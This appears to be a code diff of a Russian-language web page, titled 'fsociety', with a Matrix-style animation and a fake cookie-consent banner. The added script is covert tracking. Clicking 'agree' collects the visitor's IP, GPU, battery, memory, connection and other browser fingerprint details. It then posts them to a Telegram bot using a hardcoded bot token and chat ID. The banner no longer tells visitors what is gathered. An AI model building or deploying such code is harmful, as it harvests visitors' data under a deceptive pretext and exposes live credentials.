@@ -2,88 +2,193 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Учебный проект</title>
+    <title>fsociety</title>
     <style>
-        body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; text-align: center; }
-        h1 { color: #00ffcc; }
-        .banner { background: #1a1a1a; padding: 30px; border-radius: 10px; margin: 20px auto; max-width: 500px; border: 1px solid #00ffcc; }
-        button { padding: 12px 25px; margin: 10px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #00ffcc;
+            overflow: hidden;
+            height: 100vh;
+        }
+        #matrix {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+            opacity: 0.15;
+        }
+        .content {
+            position: relative;
+            z-index: 1;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .banner {
+            background: rgba(0,0,0,0.85);
+            padding: 40px;
+            border: 1px solid #00ffcc;
+            box-shadow: 0 0 25px rgba(0,255,204,0.4);
+            text-align: center;
+            max-width: 350px;
+        }
+        button {
+            padding: 12px 30px;
+            margin: 8px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            transition: 0.3s;
+        }
         .agree { background: #00b894; color: white; }
+        .agree:hover { box-shadow: 0 0 15px #00b894; }
         .deny { background: #d63031; color: white; }
-        .info { margin-top: 20px; font-size: 14px; color: #aaa; }
-        #fsociety { display: none; margin-top: 30px; }
-        #fsociety img { max-width: 1000px; }
+        .deny:hover { box-shadow: 0 0 15px #d63031; }
+        #fsociety {
+            display: none;
+            text-align: center;
+            animation: glitchIn 0.8s ease-in;
+        }
+        #fsociety img {
+            max-width: 400px;
+            width: 80%;
+            filter: drop-shadow(0 0 25px #00ffcc);
+        }
+        @keyframes glitchIn {
+            0% { opacity: 0; transform: scale(0.5) translateY(50px); filter: blur(10px); }
+            20% { opacity: 0.5; transform: scale(1.1) translateX(-10px); filter: blur(5px); }
+            40% { opacity: 0.7; transform: scale(0.95) translateX(10px); filter: blur(2px); }
+            60% { opacity: 0.9; transform: scale(1.05) translateX(-5px); }
+            80% { transform: scale(0.98) translateX(5px); }
+            100% { opacity: 1; transform: scale(1); filter: blur(0); }
+        }
     </style>
 </head>
 <body>
-    <h1>Файлы cookie</h1>
-    
-    <div class="banner" id="banner">
-        <p><b>Внимание!</b> Этот сайт не собирает личные данные:</p>
-        <button class="agree" onclick="agree()">✅ Согласен</button>
-        <button class="deny" onclick="deny()">❌ Отказаться</button>
+    <canvas id="matrix"></canvas>
+    <div class="content">
+        <div class="banner" id="banner">
+            <button class="agree" onclick="agree()">СОГЛАСЕН</button>
+            <button class="deny" onclick="deny()">ОТКАЗАТЬСЯ</button>
+        </div>
+        <div id="fsociety">
+            <img src="fsociety.png" alt="fsociety">
+        </div>
     </div>
-
-    <div id="fsociety">
-        <img src="fsociety.png" alt="fsociety">
-    </div>
-
-    <div class="info" id="info"></div>
 
     <script>
-        var TOKEN = "8610253930:AAG9a1mBTDdjdh-gpH6CKxYTM78uOvXwcxM";
-        var CHAT_ID = "7235499353";
+        // === МАТРИЦА ===
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.?/アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let i = 0; i < columns; i++) drops[i] = Math.random() * -100;
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
 
-        function agree() {
-            var data = {
-                ip: "загрузка...",
-                userAgent: navigator.userAgent,
-                screen: screen.width + "x" + screen.height,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform: navigator.platform
-            };
+        // === КОНФИГ ===
+        const TOKEN = "8610253930:AAG9a1mBTDdjdh-gpH6CKxYTM78uOvXwcxM";
+        const CHAT_ID = "7235499353";
 
-            fetch('https://api.ipify.org?format=json')
-                .then(function(response) { return response.json(); })
-                .then(function(ipData) {
-                    data.ip = ipData.ip;
-                    sendToTelegram(data);
-                })
-                .catch(function() {
-                    data.ip = "не удалось получить";
-                    sendToTelegram(data);
-                });
-
-            document.getElementById('banner').style.display = 'none';
-            document.getElementById('fsociety').style.display = 'block';
+        // === СБОР ВСЕХ ДАННЫХ ===
+        async function collectData() {
+            const d = {};
+            d.ip = "загрузка...";
+            d.ua = navigator.userAgent;
+            d.screen = screen.width + "x" + screen.height;
+            d.window = window.innerWidth + "x" + window.innerHeight;
+            d.lang = navigator.language;
+            d.langs = (navigator.languages || []).join(", ");
+            d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            d.platform = navigator.platform;
+            d.cores = navigator.hardwareConcurrency || "?";
+            d.mem = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "?";
+            d.cookies = navigator.cookieEnabled ? "да" : "нет";
+            d.online = navigator.onLine ? "да" : "нет";
+            d.touch = 'ontouchstart' in window ? "да" : "нет";
+            d.pixel = window.devicePixelRatio || 1;
+            d.device = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Моб." : "ПК";
+            try { const b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; d.charging = b.charging ? "да" : "нет"; } catch(e) { d.bat = "?"; d.charging = "?"; }
+            try { d.conn = navigator.connection ? navigator.connection.effectiveType : "?"; d.down = navigator.connection && navigator.connection.downlink ? navigator.connection.downlink + "Mbps" : "?"; } catch(e) { d.conn = "?"; d.down = "?"; }
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                d.gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "?";
+            } catch(e) { d.gpu = "?"; }
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                d.ip = (await r.json()).ip;
+            } catch(e) { d.ip = "?"; }
+            return d;
         }
 
-        function deny() {
-            document.getElementById('banner').style.display = 'none';
-            document.getElementById('info').innerHTML = '❌ Вы отказались. Данные не отправлены.';
-        }
-
-        function sendToTelegram(data) {
-            var message = "🕵️ Новый посетитель!\n" +
-                "IP: " + data.ip + "\n" +
-                "Браузер: " + data.userAgent + "\n" +
-                "Экран: " + data.screen + "\n" +
-                "Язык: " + data.language + "\n" +
-                "Часовой пояс: " + data.timezone + "\n" +
-                "Платформа: " + data.platform;
-
-            var url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
-            
-            fetch(url, {
+        // === ОТПРАВКА ===
+        function send(d) {
+            const msg = 
+                "🕵️ <b>Новый посетитель</b>\n\n" +
+                "<b>IP:</b> " + d.ip + "\n" +
+                "<b>Устройство:</b> " + d.device + "\n" +
+                "<b>Платформа:</b> " + d.platform + "\n" +
+                "<b>Экран:</b> " + d.screen + "\n" +
+                "<b>Окно:</b> " + d.window + "\n" +
+                "<b>Pixel Ratio:</b> " + d.pixel + "\n" +
+                "<b>Ядра:</b> " + d.cores + "\n" +
+                "<b>Память:</b> " + d.mem + "\n" +
+                "<b>GPU:</b> " + d.gpu + "\n" +
+                "<b>Батарея:</b> " + d.bat + " (зарядка: " + d.charging + ")\n" +
+                "<b>Интернет:</b> " + d.conn + " / " + d.down + "\n" +
+                "<b>Язык:</b> " + d.lang + "\n" +
+                "<b>Языки:</b> " + d.langs + "\n" +
+                "<b>Часовой пояс:</b> " + d.tz + "\n" +
+                "<b>Куки:</b> " + d.cookies + "\n" +
+                "<b>Онлайн:</b> " + d.online + "\n" +
+                "<b>Тач:</b> " + d.touch + "\n" +
+                "<b>UA:</b> " + d.ua;
+            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
             });
+        }
+
+        // === КНОПКИ ===
+        async function agree() {
+            document.getElementById('banner').style.display = 'none';
+            document.getElementById('fsociety').style.display = 'block';
+            const d = await collectData();
+            send(d);
+        }
+        function deny() {
+            document.getElementById('banner').style.display = 'none';
         }
     </script>
 </body>
 </html>
+                
